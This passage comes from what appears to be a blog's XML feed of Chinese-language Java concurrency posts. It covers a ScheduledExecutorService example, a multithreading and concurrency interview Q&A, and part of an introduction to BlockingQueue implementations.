<ul>
<li>相比于Timer的单线程，它是通过线程池的方式来执行任务的</li>
<li>可以很灵活的去设定第一次执行任务delay时间</li>
<li>提供了良好的约定，以便设定执行的时间间隔</li>
</ul>
<p>下面是实现代码，我们通过ScheduledExecutorService#scheduleAtFixedRate展示这个例子，通过代码里参数的控制，首次执行加了delay时间。</p>
<p>import java.util.concurrent.Executors;<br>import java.util.concurrent.ScheduledExecutorService;<br>import java.util.concurrent.TimeUnit;<br>// 第三种方法：设定指定任务task在指定延迟delay后进行固定频率peroid的执行。  <br>public class Task3 {<br>  public static void main(String[] args) {<br>    Runnable runnable = new Runnable() {<br>      public void run() {<br>        // task to run goes here<br>        System.out.println(“Hello !!”);<br>      }<br>    };<br>    ScheduledExecutorService service = Executors<br>                    .newSingleThreadScheduledExecutor();<br>    service.scheduleAtFixedRate(runnable, 0, 1, TimeUnit.SECONDS);<br>  }<br>}</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA并发</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA多线程和并发基础面试问答</title>
    <url>/2017/06/10/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%B9%B6%E5%8F%91%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%97%AE%E7%AD%94/</url>
    <content><![CDATA[<h2 id="Java多线程面试问题"><a href="#Java多线程面试问题" class="headerlink" title="Java多线程面试问题"></a>Java多线程面试问题</h2><h3 id="1-进程和线程之间有什么不同？"><a href="#1-进程和线程之间有什么不同？" class="headerlink" title="1.   进程和线程之间有什么不同？"></a>1.   进程和线程之间有什么不同？</h3><p>一个进程是一个独立(self contained)的运行环境，它可以被看作一个程序或者一个应用。而线程是在进程中执行的一个任务。Java运行环境是一个包含了不同的类和程序的单一进程。线程可以被称为轻量级进程。线程需要较少的资源来创建和驻留在进程中，并且可以共享进程中的资源。</p>
<h3 id="2-多线程编程的好处是什么？"><a href="#2-多线程编程的好处是什么？" class="headerlink" title="2.   多线程编程的好处是什么？"></a>2.   多线程编程的好处是什么？</h3><p>在多线程程序中，多个线程被并发的执行以提高程序的效率，CPU不会因为某个线程需要等待资源而进入空闲状态。多个线程共享堆内存(heap memory)，因此创建多个线程去执行一些任务会比创建多个进程更好。举个例子，Servlets比CGI更好，是因为Servlets支持多线程而CGI不支持。</p>
<h3 id="3-用户线程和守护线程有什么区别？"><a href="#3-用户线程和守护线程有什么区别？" class="headerlink" title="3.   用户线程和守护线程有什么区别？"></a>3.   用户线程和守护线程有什么区别？</h3><p>当我们在Java程序中创建一个线程，它就被称为用户线程。一个守护线程是在后台执行并且不会阻止JVM终止的线程。当没有用户线程在运行的时候，JVM关闭程序并且退出。一个守护线程创建的子线程依然是守护线程。</p>
<h3 id="4-我们如何创建一个线程？"><a href="#4-我们如何创建一个线程？" class="headerlink" title="4.   我们如何创建一个线程？"></a>4.   我们如何创建一个线程？</h3><p>有两种创建线程的方法：一是实现Runnable接口，然后将它传递给Thread的构造函数，创建一个Thread对象；二是直接继承Thread类。若想了解更多可以阅读这篇关于如何在<a href="http://www.journaldev.com/1016/java-thread-example-extending-thread-class-and-implementing-runnable-interface">Java中创建线程</a>的文章。</p>
<h3 id="5-有哪些不同的线程生命周期？"><a href="#5-有哪些不同的线程生命周期？" class="headerlink" title="5.   有哪些不同的线程生命周期？"></a>5.   有哪些不同的线程生命周期？</h3><p>当我们在Java程序中新建一个线程时，它的状态是<em>New。_当我们调用线程的start()方法时，状态被改变为_Runnable_。线程调度器会为_Runnable_线程池中的线程分配CPU时间并且讲它们的状态改变为_Running。_其他的线程状态还有_Waiting，Blocked</em> 和_Dead_。读这篇文章可以了解更多关于<a href="http://www.journaldev.com/1044/life-cycle-of-thread-understanding-thread-states-in-java">线程生命周期</a>的知识。</p>
<h3 id="6-可以直接调用Thread类的run-方法么？"><a href="#6-可以直接调用Thread类的run-方法么？" class="headerlink" title="6.   可以直接调用Thread类的run()方法么？"></a>6.   可以直接调用Thread类的run()方法么？</h3><p>当然可以，但是如果我们调用了Thread的run()方法，它的行为就会和普通的方法一样，为了在新的线程中执行我们的代码，必须使用Thread.start()方法。</p>
<h3 id="7-如何让正在运行的线程暂停一段时间？"><a href="#7-如何让正在运行的线程暂停一段时间？" class="headerlink" title="7.   如何让正在运行的线程暂停一段时间？"></a>7.   如何让正在运行的线程暂停一段时间？</h3><p>我们可以使用Thread类的Sleep()方法让线程暂停一段时间。需要注意的是，这并不会让线程终止，一旦从休眠中唤醒线程，线程的状态将会被改变为_Runnable_，并且根据线程调度，它将得到执行。</p>
<h3 id="8-你对线程优先级的理解是什么？"><a href="#8-你对线程优先级的理解是什么？" class="headerlink" title="8.   你对线程优先级的理解是什么？"></a>8.   你对线程优先级的理解是什么？</h3><p>每一个线程都是有优先级的，一般来说，高优先级的线程在运行时会具有优先权，但这依赖于线程调度的实现，这个实现是和操作系统相关的(OS dependent)。我们可以定义线程的优先级，但是这并不能保证高优先级的线程会在低优先级的线程前执行。线程优先级是一个int变量(从1-10)，1代表最低优先级，10代表最高优先级。</p>
<h3 id="9-什么是线程调度器-Thread-Scheduler-和时间分片-Time-Slicing-？"><a href="#9-什么是线程调度器-Thread-Scheduler-和时间分片-Time-Slicing-？" class="headerlink" title="9.   什么是线程调度器(Thread Scheduler)和时间分片(Time Slicing)？"></a>9.   什么是线程调度器(Thread Scheduler)和时间分片(Time Slicing)？</h3><p>线程调度器是一个操作系统服务，它负责为_Runnable_状态的线程分配CPU时间。一旦我们创建一个线程并启动它，它的执行便依赖于线程调度器的实现。时间分片是指将可用的CPU时间分配给可用的_Runnable_线程的过程。分配CPU时间可以基于线程优先级或者线程等待的时间。线程调度并不受到Java虚拟机控制，所以由应用程序来控制它是更好的选择（也就是说不要让你的程序依赖于线程的优先级）。</p>
<h3 id="10-在多线程中，什么是上下文切换-context-switching-？"><a href="#10-在多线程中，什么是上下文切换-context-switching-？" class="headerlink" title="10.   在多线程中，什么是上下文切换(context-switching)？"></a>10.   在多线程中，什么是上下文切换(context-switching)？</h3><p>上下文切换是存储和恢复CPU状态的过程，它使得线程执行能够从中断点恢复执行。上下文切换是多任务操作系统和多线程环境的基本特征。</p>
<h3 id="11-你如何确保main-方法所在的线程是Java程序最后结束的线程？"><a href="#11-你如何确保main-方法所在的线程是Java程序最后结束的线程？" class="headerlink" title="11.   你如何确保main()方法所在的线程是Java程序最后结束的线程？"></a>11.   你如何确保main()方法所在的线程是Java程序最后结束的线程？</h3><p>我们可以使用Thread类的joint()方法来确保所有程序创建的线程在main()方法退出前结束。这里有一篇文章关于<a href="http://www.journaldev.com/1024/java-thread-join-example-with-explanation">Thread类的joint()方法</a>。</p>
<h3 id="12-线程之间是如何通信的？"><a href="#12-线程之间是如何通信的？" class="headerlink" title="12.线程之间是如何通信的？"></a>12.线程之间是如何通信的？</h3><p>当线程间是可以共享资源时，线程间通信是协调它们的重要的手段。Object类中wait()\notify()\notifyAll()方法可以用于线程间通信关于资源的锁的状态。点击<a href="http://www.journaldev.com/1037/java-thread-wait-notify-and-notifyall-example">这里</a>有更多关于线程wait, notify和notifyAll.</p>
<h3 id="13-为什么线程通信的方法wait-notify-和notifyAll-被定义在Object类里？"><a href="#13-为什么线程通信的方法wait-notify-和notifyAll-被定义在Object类里？" class="headerlink" title="13.为什么线程通信的方法wait(), notify()和notifyAll()被定义在Object类里？"></a>13.为什么线程通信的方法wait(), notify()和notifyAll()被定义在Object类里？</h3><p>Java的每个对象中都有一个锁(monitor，也可以成为监视器) 并且wait()，notify()等方法用于等待对象的锁或者通知其他线程对象的监视器可用。在Java的线程中并没有可供任何对象使用的锁和同步器。这就是为什么这些方法是Object类的一部分，这样Java的每一个类都有用于线程间通信的基本方法</p>
<h3 id="14-为什么wait-notify-和notifyAll-必须在同步方法或者同步块中被调用？"><a href="#14-为什么wait-notify-和notifyAll-必须在同步方法或者同步块中被调用？" class="headerlink" title="14.   为什么wait(), notify()和notifyAll()必须在同步方法或者同步块中被调用？"></a>14.   为什么wait(), notify()和notifyAll()必须在同步方法或者同步块中被调用？</h3><p>当一个线程需要调用对象的wait()方法的时候，这个线程必须拥有该对象的锁，接着它就会释放这个对象锁并进入等待状态直到其他线程调用这个对象上的notify()方法。同样的，当一个线程需要调用对象的notify()方法时，它会释放这个对象的锁，以便其他在等待的线程就可以得到这个对象锁。由于所有的这些方法都需要线程持有对象的锁，这样就只能通过同步来实现，所以他们只能在同步方法或者同步块中被调用。</p>
<h3 id="15-为什么Thread类的sleep-和yield-方法是静态的？"><a href="#15-为什么Thread类的sleep-和yield-方法是静态的？" class="headerlink" title="15.   为什么Thread类的sleep()和yield()方法是静态的？"></a>15.   为什么Thread类的sleep()和yield()方法是静态的？</h3><p>Thread类的sleep()和yield()方法将在当前正在执行的线程上运行。所以在其他处于等待状态的线程上调用这些方法是没有意义的。这就是为什么这些方法是静态的。它们可以在当前正在执行的线程中工作，并避免程序员错误的认为可以在其他非运行线程调用这些方法。</p>
<h3 id="16-如何确保线程安全？"><a href="#16-如何确保线程安全？" class="headerlink" title="16.如何确保线程安全？"></a>16.如何确保线程安全？</h3><p>在Java中可以有很多方法来保证线程安全——同步，使用原子类(atomic concurrent classes)，实现并发锁，使用volatile关键字，使用不变类和线程安全类。在<a href="http://www.journaldev.com/1061/java-synchronization-and-thread-safety-tutorial-with-examples">线程安全教程</a>中，你可以学到更多。</p>
<h3 id="17-volatile关键字在Java中有什么作用？"><a href="#17-volatile关键字在Java中有什么作用？" class="headerlink" title="17.   volatile关键字在Java中有什么作用？"></a>17.   volatile关键字在Java中有什么作用？</h3><p>当我们使用volatile关键字去修饰变量的时候，所以线程都会直接读取该变量并且不缓存它。这就确保了线程读取到的变量是同内存中是一致的。</p>
<h3 id="18-同步方法和同步块，哪个是更好的选择？"><a href="#18-同步方法和同步块，哪个是更好的选择？" class="headerlink" title="18.   同步方法和同步块，哪个是更好的选择？"></a>18.   同步方法和同步块，哪个是更好的选择？</h3><p>同步块是更好的选择，因为它不会锁住整个对象（当然你也可以让它锁住整个对象）。同步方法会锁住整个对象，哪怕这个类中有多个不相关联的同步块，这通常会导致他们停止执行并需要等待获得这个对象上的锁。</p>
<h3 id="19-如何创建守护线程？"><a href="#19-如何创建守护线程？" class="headerlink" title="19.如何创建守护线程？"></a>19.如何创建守护线程？</h3><p>使用Thread类的setDaemon(true)方法可以将线程设置为守护线程，需要注意的是，需要在调用start()方法前调用这个方法，否则会抛出IllegalThreadStateException异常。</p>
<h3 id="20-什么是ThreadLocal"><a href="#20-什么是ThreadLocal" class="headerlink" title="20.   什么是ThreadLocal?"></a>20.   什么是ThreadLocal?</h3><p>ThreadLocal用于创建线程的本地变量，我们知道一个对象的所有线程会共享它的全局变量，所以这些变量不是线程安全的，我们可以使用同步技术。但是当我们不想使用同步的时候，我们可以选择ThreadLocal变量。 每个线程都会拥有他们自己的Thread变量，它们可以使用get()\set()方法去获取他们的默认值或者在线程内部改变他们的值。ThreadLocal实例通常是希望它们同线程状态关联起来是private static属性。在<a href="http://www.journaldev.com/1076/java-threadlocal-example-to-create-thread-local-variables">ThreadLocal例子</a>这篇文章中你可以看到一个关于ThreadLocal的小程序。</p>
<h3 id="21-什么是Thread-Group？为什么建议使用它？"><a href="#21-什么是Thread-Group？为什么建议使用它？" class="headerlink" title="21.   什么是Thread Group？为什么建议使用它？"></a>21.   什么是Thread Group？为什么建议使用它？</h3><p>ThreadGroup是一个类，它的目的是提供关于线程组的信息。 ThreadGroup API比较薄弱，它并没有比Thread提供了更多的功能。它有两个主要的功能：一是获取线程组中处于活跃状态线程的列表；二是设置为线程设置未捕获异常处理器(ncaught exception handler)。但在Java 1.5中Thread类也添加了<em>setUncaughtExceptionHandler(UncaughtExceptionHandler eh)</em> 方法，所以ThreadGroup是已经过时的，不建议继续使用。</p>
<p>t1.setUncaughtExceptionHandler(new UncaughtExceptionHandler(){</p>
<p>@Override<br>public void uncaughtException(Thread t, Throwable e) {<br>System.out.println(“exception occured:”+e.getMessage());<br>}</p>
<p>});</p>
<h3 id="22-什么是Java线程转储-Thread-Dump-，如何得到它？"><a href="#22-什么是Java线程转储-Thread-Dump-，如何得到它？" class="headerlink" title="22.   什么是Java线程转储(Thread Dump)，如何得到它？"></a>22.   什么是Java线程转储(Thread Dump)，如何得到它？</h3><p>线程转储是一个JVM活动线程的列表，它对于分析系统瓶颈和死锁非常有用。有很多方法可以获取线程转储——使用Profiler，Kill -3命令，jstack工具等等。我更喜欢jstack工具，因为它容易使用并且是JDK自带的。由于它是一个基于终端的工具，所以我们可以编写一些脚本去定时的产生线程转储以待分析。读这篇文档可以了解更多关于<a href="http://www.journaldev.com/1053/how-to-generate-thread-dump-in-java">产生线程转储</a>的知识。</p>
<h3 id="23-什么是死锁-Deadlock-？如何分析和避免死锁？"><a href="#23-什么是死锁-Deadlock-？如何分析和避免死锁？" class="headerlink" title="23.   什么是死锁(Deadlock)？如何分析和避免死锁？"></a>23.   什么是死锁(Deadlock)？如何分析和避免死锁？</h3><p>死锁是指两个以上的线程永远阻塞的情况，这种情况产生至少需要两个以上的线程和两个以上的资源。 分析死锁，我们需要查看Java应用程序的线程转储。我们需要找出那些状态为BLOCKED的线程和他们等待的资源。每个资源都有一个唯一的id，用这个id我们可以找出哪些线程已经拥有了它的对象锁。 避免嵌套锁，只在需要的地方使用锁和避免无限期等待是避免死锁的通常办法，阅读这篇文章去学习<a href="http://www.journaldev.com/1058/java-deadlock-example-and-how-to-analyze-deadlock-situation">如何分析死锁</a>。</p>
<h3 id="24-什么是Java-Timer类？如何创建一个有特定时间间隔的任务？"><a href="#24-什么是Java-Timer类？如何创建一个有特定时间间隔的任务？" class="headerlink" title="24.   什么是Java Timer类？如何创建一个有特定时间间隔的任务？"></a>24.   什么是Java Timer类？如何创建一个有特定时间间隔的任务？</h3><p>java.util.Timer是一个工具类，可以用于安排一个线程在未来的某个特定时间执行。Timer类可以用安排一次性任务或者周期任务。 java.util.TimerTask是一个实现了Runnable接口的抽象类，我们需要去继承这个类来创建我们自己的定时任务并使用Timer去安排它的执行。 这里有关于<a href="http://www.journaldev.com/1050/java-timer-and-timertask-example-tutorial">java Timer的例子</a>。</p>
<h3 id="25-什么是线程池？如何创建一个Java线程池？"><a href="#25-什么是线程池？如何创建一个Java线程池？" class="headerlink" title="25.   什么是线程池？如何创建一个Java线程池？"></a>25.   什么是线程池？如何创建一个Java线程池？</h3><p>一个线程池管理了一组工作线程，同时它还包括了一个用于放置等待执行的任务的队列。 java.util.concurrent.Executors提供了一个 java.util.concurrent.Executor接口的实现用于创建线程池。<a href="http://www.journaldev.com/1069/java-thread-pool-example-using-executors-and-threadpoolexecutor">线程池例子</a>展现了如何创建和使用线程池，或者阅读<a href="http://www.journaldev.com/2340/java-scheduledthreadpoolexecutor-example-to-schedule-tasks-after-delay-and-execute-periodically">ScheduledThreadPoolExecutor</a>例子，了解如何创建一个周期任务。  </p>
<hr>
<h2 id="Java并发面试问题"><a href="#Java并发面试问题" class="headerlink" title="Java并发面试问题"></a><strong>Java并发面试问题</strong></h2><h3 id="1-什么是原子操作？在Java-Concurrency-API中有哪些原子类-atomic-classes-？"><a href="#1-什么是原子操作？在Java-Concurrency-API中有哪些原子类-atomic-classes-？" class="headerlink" title="1.   什么是原子操作？在Java Concurrency API中有哪些原子类(atomic classes)？"></a>1.   什么是原子操作？在Java Concurrency API中有哪些原子类(atomic classes)？</h3><p>原子操作是指一个不受其他操作影响的操作任务单元。原子操作是在多线程环境下避免数据不一致必须的手段。 int++并不是一个原子操作，所以当一个线程读取它的值并加1时，另外一个线程有可能会读到之前的值，这就会引发错误。 为了解决这个问题，必须保证增加操作是原子的，在JDK1.5之前我们可以使用同步技术来做到这一点。到JDK1.5，java.util.concurrent.atomic包提供了int和long类型的装类，它们可以自动的保证对于他们的操作是原子的并且不需要使用同步。可以阅读这篇文章来了解<a href="http://www.journaldev.com/1095/java-atomic-operations-atomicinteger-example">Java的atomic类</a>。</p>
<h3 id="2-Java-Concurrency-API中的Lock接口-Lock-interface-是什么？对比同步它有什么优势？"><a href="#2-Java-Concurrency-API中的Lock接口-Lock-interface-是什么？对比同步它有什么优势？" class="headerlink" title="2.   Java Concurrency API中的Lock接口(Lock interface)是什么？对比同步它有什么优势？"></a>2.   Java Concurrency API中的Lock接口(Lock interface)是什么？对比同步它有什么优势？</h3><p>Lock接口比同步方法和同步块提供了更具扩展性的锁操作。他们允许更灵活的结构，可以具有完全不同的性质，并且可以支持多个相关类的条件对象。 它的优势有：</p>
<ul>
<li>可以使锁更公平</li>
<li>可以使线程在等待锁的时候响应中断</li>
<li>可以让线程尝试获取锁，并在无法获取锁的时候立即返回或者等待一段时间</li>
<li>可以在不同的范围，以不同的顺序获取和释放锁</li>
</ul>
<p>阅读更多<a href="http://www.journaldev.com/2377/java-lock-example-and-concurrency-lock-vs-synchronized">关于锁的例子</a></p>
<h3 id="3-什么是Executors框架？"><a href="#3-什么是Executors框架？" class="headerlink" title="3.   什么是Executors框架？"></a>3.   什么是Executors框架？</h3><p>Executor框架同java.util.concurrent.Executor 接口在Java 5中被引入。Executor框架是一个根据一组执行策略调用，调度，执行和控制的异步任务的框架。 无限制的创建线程会引起应用程序内存溢出。所以创建一个线程池是个更好的的解决方案，因为可以限制线程的数量并且可以回收再利用这些线程。利用Executors框架可以非常方便的创建一个线程池，阅读这篇文章可以了解<a href="http://www.journaldev.com/1069/java-thread-pool-example-using-executors-and-threadpoolexecutor">如何使用Executor框架创建一个线程池</a>。</p>
<h3 id="4-什么是阻塞队列？如何使用阻塞队列来实现生产者-消费者模型？"><a href="#4-什么是阻塞队列？如何使用阻塞队列来实现生产者-消费者模型？" class="headerlink" title="4.   什么是阻塞队列？如何使用阻塞队列来实现生产者-消费者模型？"></a>4.   什么是阻塞队列？如何使用阻塞队列来实现生产者-消费者模型？</h3><p>java.util.concurrent.BlockingQueue的特性是：当队列是空的时，从队列中获取或删除元素的操作将会被阻塞，或者当队列是满时，往队列里添加元素的操作会被阻塞。 阻塞队列不接受空值，当你尝试向队列中添加空值的时候，它会抛出NullPointerException。 阻塞队列的实现都是线程安全的，所有的查询方法都是原子的并且使用了内部锁或者其他形式的并发控制。 BlockingQueue 接口是java collections框架的一部分，它主要用于实现生产者-消费者问题。 阅读这篇文章了解<a href="http://www.journaldev.com/1034/java-blockingqueue-example-implementing-producer-consumer-problem">如何使用阻塞队列实现生产者-消费者问题。</a></p>
<h3 id="5-什么是Callable和Future"><a href="#5-什么是Callable和Future" class="headerlink" title="5.   什么是Callable和Future?"></a>5.   什么是Callable和Future?</h3><p>Java 5在concurrency包中引入了java.util.concurrent.Callable 接口，它和Runnable接口很相似，但它可以返回一个对象或者抛出一个异常。 Callable接口使用泛型去定义它的返回类型。Executors类提供了一些有用的方法去在线程池中执行Callable内的任务。由于Callable任务是并行的，我们必须等待它返回的结果。java.util.concurrent.Future对象为我们解决了这个问题。在线程池提交Callable任务后返回了一个Future对象，使用它我们可以知道Callable任务的状态和得到Callable返回的执行结果。Future提供了get()方法让我们可以等待Callable结束并获取它的执行结果。 阅读这篇文章了解更多<a href="http://www.journaldev.com/1090/java-callable-future-example">关于Callable，Future的例子</a>。</p>
<h3 id="6-什么是FutureTask"><a href="#6-什么是FutureTask" class="headerlink" title="6.   什么是FutureTask?"></a>6.   什么是FutureTask?</h3><p>FutureTask是Future的一个基础实现，我们可以将它同Executors使用处理异步任务。通常我们不需要使用FutureTask类，单当我们打算重写Future接口的一些方法并保持原来基础的实现是，它就变得非常有用。我们可以仅仅继承于它并重写我们需要的方法。阅读<a href="http://www.journaldev.com/1650/java-futuretask-example-program">Java FutureTask例子</a>，学习如何使用它。</p>
<h3 id="7-什么是并发容器的实现？"><a href="#7-什么是并发容器的实现？" class="headerlink" title="7.什么是并发容器的实现？"></a>7.什么是并发容器的实现？</h3><p>Java集合类都是快速失败的，这就意味着当集合被改变且一个线程在使用迭代器遍历集合的时候，迭代器的next()方法将抛出ConcurrentModificationException异常。 并发容器支持并发的遍历和并发的更新。 主要的类有ConcurrentHashMap, CopyOnWriteArrayList 和CopyOnWriteArraySet，阅读这篇文章了解<a href="http://www.journaldev.com/378/how-to-avoid-concurrentmodificationexception-when-using-an-iterator">如何避免ConcurrentModificationException</a>。</p>
<h3 id="8-Executors类是什么？"><a href="#8-Executors类是什么？" class="headerlink" title="8.   Executors类是什么？"></a>8.   Executors类是什么？</h3><p>Executors为Executor，ExecutorService，ScheduledExecutorService，ThreadFactory和Callable类提供了一些工具方法。 Executors可以用于方便的创建线程池。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA并发之阻塞队列</title>
    <url>/2017/06/08/java%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h3 id="1-什么是阻塞队列"><a href="#1-什么是阻塞队列" class="headerlink" title="1.什么是阻塞队列"></a><strong>1.什么是阻塞队列</strong></h3><p>阻塞队列常用于生产者和消费者的场景，生产者是往队列里添加元素的线程，消费者是从队列里拿元素的线程。阻塞队列就是生产者存放元素的容器，而消费者也只从容器里拿元素。</p>
<h4 id="BlockingQueue有两个常见阻塞场景"><a href="#BlockingQueue有两个常见阻塞场景" class="headerlink" title="BlockingQueue有两个常见阻塞场景"></a><strong>BlockingQueue有两个常见阻塞场景</strong></h4><ol>
<li><p>当队列中没有数据的情况下，消费者端的所有线程都会被自动阻塞（挂起），直到有数据放入队列。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1417629-02089dea3758a506?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>这里写图片描述</p>
</li>
<li><p>当队列中填满数据的情况下，生产者端的所有线程都会被自动阻塞（挂起），直到队列中有空的位置，线程被自动唤醒。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1417629-0e39332e2bfb2665?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>这里写图片描述</p>
</li>
</ol>
<p>那么支持以上两种阻塞场景的队列我们称之为阻塞队列。</p>
<h4 id="BlockingQueue的核心方法"><a href="#BlockingQueue的核心方法" class="headerlink" title="BlockingQueue的核心方法"></a><strong>BlockingQueue的核心方法</strong></h4><p>放入数据：</p>
<ul>
<li>offer(anObject):表示如果可能的话,将anObject加到BlockingQueue里,即如果BlockingQueue可以容纳, 则返回true,否则返回false.（本方法不阻塞当前执行方法的线程）</li>
<li>offer(E o, long timeout, TimeUnit unit),可以设定等待的时间，如果在指定的时间内，还不能往队列中 加入BlockingQueue，则返回失败。</li>
<li>put(anObject):把anObject加到BlockingQueue里,如果BlockQueue没有空间,则调用此方法的线程被阻断直到BlockingQueue里面有空间再继续.</li>
</ul>
<p>获取数据：</p>
<ul>
<li>poll(time):取走BlockingQueue里排在首位的对象,若不能立即取出,则可以等time参数规定的时间, 取不到时返回null;</li>
<li>poll(long timeout, TimeUnit unit)：从BlockingQueue取出一个队首的对象，如果在指定时间内， 队列一旦有数据可取，则立即返回队列中的数据。否则知道时间超时还没有数据可取，返回失败。</li>
<li>take():取走BlockingQueue里排在首位的对象,若BlockingQueue为空,阻断进入等待状态直到 BlockingQueue有新的数据被加入;</li>
<li>drainTo():一次性从BlockingQueue获取所有可用的数据对象（还可以指定获取数据的个数）， 通过该方法，可以提升获取数据效率；不需要多次分批加锁或释放锁。</li>
</ul>
<h4 id="插入和移除操作的4种处理方式"><a href="#插入和移除操作的4种处理方式" class="headerlink" title="插入和移除操作的4种处理方式"></a><strong>插入和移除操作的4种处理方式</strong></h4><ul>
<li>抛出异常：是指当阻塞队列满时候，再往队列里插入元素，会抛出IllegalStateException(“Queue full”)异常。当队列为空时，从队列里获取元素时会抛出NoSuchElementException异常 。</li>
<li>返回特殊值：插入方法会返回是否成功，成功则返回true。移除方法，则是从队列里拿出一个元素，如果没有则返回null</li>
<li>一直阻塞：当阻塞队列满时，如果生产者线程往队列里put元素，队列会一直阻塞生产者线程，直到拿到数据，或者响应中断退出。当队列空时，消费者线程试图从队列里take元素，队列也会阻塞消费者线程，直到队列可用。</li>
<li>超时退出：当阻塞队列满时，队列会阻塞生产者线程一段时间，如果超过一定的时间，生产者线程就会退出。</li>
</ul>
<h3 id="2-Java中的阻塞队列"><a href="#2-Java中的阻塞队列" class="headerlink" title="2.Java中的阻塞队列"></a><strong>2.Java中的阻塞队列</strong></h3><p>JDK7提供了7个阻塞队列，分别是：</p>
<ul>
<li>ArrayBlockingQueue ：由数组结构组成的有界阻塞队列。</li>
<li>LinkedBlockingQueue ：由链表结构组成的有界阻塞队列。</li>
<li>PriorityBlockingQueue ：支持优先级排序的无界阻塞队列。</li>
<li>DelayQueue：使用优先级队列实现的无界阻塞队列。</li>
<li>SynchronousQueue：不存储元素的阻塞队列。</li>
<li>LinkedTransferQueue：由链表结构组成的无界阻塞队列。</li>
<li>LinkedBlockingDeque：由链表结构组成的双向阻塞队列。</li>
</ul>
<h4 id="ArrayBlockingQueue"><a href="#ArrayBlockingQueue" class="headerlink" title="ArrayBlockingQueue"></a><strong>ArrayBlockingQueue</strong></h4><p>用数组实现的有界阻塞队列。此队列按照先进先出（FIFO）的原则对元素进行排序。默认情况下不保证访问者公平的访问队列，所谓公平访问队列是指阻塞的所有生产者线程或消费者线程，当队列可用时，可以按照阻塞的先后顺序访问队列，即先阻塞的生产者线程，可以先往队列里插入元素，先阻塞的消费者线程，可以先从队列里获取元素。通常情况下为了保证公平性会降低吞吐量。我们可以使用以下代码创建一个公平的阻塞队列：</p>
<p>ArrayBlockingQueue fairQueue = new  ArrayBlockingQueue(1000,true);</p>
<h4 id="LinkedBlockingQueue"><a href="#LinkedBlockingQueue" class="headerlink" title="LinkedBlockingQueue"></a><strong>LinkedBlockingQueue</strong></h4><p>基于链表的阻塞队列，同ArrayListBlockingQueue类似，此队列按照先进先出（FIFO）的原则对元素进行排序，其内部也维持着一个数据缓冲队列（该队列由一个链表构成），当生产者往队列中放入一个数据时，队列会从生产者手中获取数据，并缓存在队列内部，而生产者立即返回；只有当队列缓冲区达到最大值缓存容量时（LinkedBlockingQueue可以通过构造函数指定该值），才会阻塞生产者队列，直到消费者从队列中消费掉一份数据，生产者线程会被唤醒，反之对于消费者这端的处理也基于同样的原理。而LinkedBlockingQueue之所以能够高效的处理并发数据，还因为其对于生产者端和消费者端分别采用了独立的锁来控制数据同步，这也意味着在高并发的情况下生产者和消费者可以并行地操作队列中的数据，以此来提高整个队列的并发性能。 作为开发者，我们需要注意的是，如果构造一个LinkedBlockingQueue对象，而没有指定其容量大小，LinkedBlockingQueue会默认一个类似无限大小的容量（Integer.MAX_VALUE），这样的话，如果生产者的速度一旦大于消费者的速度，也许还没有等到队列满阻塞产生，系统内存就有可能已被消耗殆尽了。 ArrayBlockingQueue和LinkedBlockingQueue是两个最普通也是最常用的阻塞队列，一般情况下，在处理多线程间的生产者消费者问题，使用这两个类足以。</p>
<h4 id="PriorityBlockingQueue"><a href="#PriorityBlockingQueue" class="headerlink" title="PriorityBlockingQueue"></a><strong>PriorityBlockingQueue</strong></h4><p>是一个支持优先级的无界队列。默认情况下元素采取自然顺序升序排列。可以自定义实现compareTo()方法来指定元素进行排序规则，或者初始化PriorityBlockingQueue时，指定构造参数Comparator来对元素进行排序。需要注意哦的是不能保证同优先级元素的顺序。</p>
<h4 id="DelayQueue"><a href="#DelayQueue" class="headerlink" title="DelayQueue"></a><strong>DelayQueue</strong></h4><p>是一个支持延时获取元素的无界阻塞队列。队列使用PriorityQueue来实现。队列中的元素必须实现Delayed接口，在创建元素时可以指定多久才能从队列中获取当前元素。只有在延迟期满时才能从队列中提取元素。我们可以将DelayQueue运用在以下应用场景：</p>
<ul>
<li>缓存系统的设计：可以用DelayQueue保存缓存元素的有效期，使用一个线程循环查询DelayQueue，一旦能从DelayQueue中获取元素时，表示缓存有效期到了。</li>
<li>定时任务调度：使用DelayQueue保存当天将会执行的任务和执行时间，一旦从DelayQueue中获取到任务就开始执行，从比如TimerQueue就是使用DelayQueue实现的。</li>
</ul>
<h4 id="SynchronousQueue"><a href="#SynchronousQueue" class="headerlink" title="SynchronousQueue"></a><strong>SynchronousQueue</strong></h4><p>是一个不存储元素的阻塞队列。每一个put操作必须等待一个take操作，否则不能继续添加元素。SynchronousQueue可以看成是一个传球手，负责把生产者线程处理的数据直接传递给消费者线程。队列本身并不存储任何元素，非常适合于传递性场景,比如在一个线程中使用的数据，传递给另外一个线程使用，SynchronousQueue的吞吐量高于LinkedBlockingQueue 和 ArrayBlockingQueue。</p>
<h4 id="LinkedTransferQueue"><a href="#LinkedTransferQueue" class="headerlink" title="LinkedTransferQueue"></a><strong>LinkedTransferQueue</strong></h4><p>是一个由链表结构组成的无界阻塞TransferQueue队列。相对于其他阻塞队列，LinkedTransferQueue多了tryTransfer和transfer方法。 transfer方法。如果当前有消费者正在等待接收元素（消费者使用take()方法或带时间限制的poll()方法时），transfer方法可以把生产者传入的元素立刻transfer（传输）给消费者。如果没有消费者在等待接收元素，transfer方法会将元素存放在队列的tail节点，并等到该元素被消费者消费了才返回。transfer方法的关键代码如下：</p>
<p>Node pred = tryAppend(s, haveData);<br>return awaitMatch(s, pred, e, (how == TIMED), nanos);</p>
